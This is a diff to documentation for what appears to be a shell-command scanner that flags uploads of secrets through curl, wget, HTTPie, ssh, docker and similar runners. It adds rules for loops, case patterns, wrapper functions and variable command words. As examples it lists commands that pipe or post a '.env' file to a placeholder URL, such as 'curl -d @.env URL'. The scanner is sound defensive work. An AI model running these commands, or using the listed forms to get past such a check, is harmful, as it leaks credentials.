@@ -797,8 +797,11 @@ user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
 `kubectl`, `apptainer`, `chroot`, `systemd-nspawn`, `bwrap`, or
 `ip netns exec`, warns on any client named after it, even one named only as
 data, as in `docker exec app apt-get install -y curl`. That holds when the
-runner is the command itself or follows a pass-through wrapper such as
-`strace`, `flock`, or `watch`. A runner reached through another command, as in
+runner is the command itself, including after a compound keyword (`do`,
+`then`, `{`, `(`, `!`), a function header, a `case` pattern, or `coproc`, as in
+`while true; do ssh host curl URL; done`, when it follows a pass-through wrapper
+such as `strace`, `flock`, or `watch`, and when a function that wraps it is
+called. A runner reached through another command, as in
 `find . -exec ssh host curl URL \;` or
 `git submodule foreach ssh host curl URL`, and a runner outside the set get
 only the client's upload rules.
@@ -806,9 +809,13 @@ only the client's upload rules.
 Piped or redirected input stays with a text consumer such as `grep`, `awk`,
 `sed`, or `jq`, so `env | grep -i http` is not an HTTPie upload, while
 `cat .env | strace -f http URL`, `sudo < .env http URL`,
-`while read -r l; do http URL; done < .env`, and
-`f() { http URL; }; f < .env` are. A client or runner named by any command of a
-substitution, such as `$(which curl)`, `$(env which curl)`,
+`while read -r l; do http URL; done < .env`,
+`case "$1" in *) < .env http URL;; esac`, and `f() { http URL; }; f < .env` are.
+A function that wraps a client, as in `up() { curl "$@"; }`, passes each call's
+arguments to that client's rules, and a `$VAR` command word with no known value,
+as in `for c in curl wget; do $c --post-file=.env URL; done`, gets the curl and
+wget upload rules when it is given a URL. A client or runner named by any
+command of a substitution, such as `$(which curl)`, `$(env which curl)`,
 `$(cd /tmp && which curl)`, or `$(command -v ssh)`, or printed with its
 arguments by `$(echo curl -d @.env URL)`, is checked the same way. When a
 substitution names several, as in `$(command -v wget || command -v curl)`, the
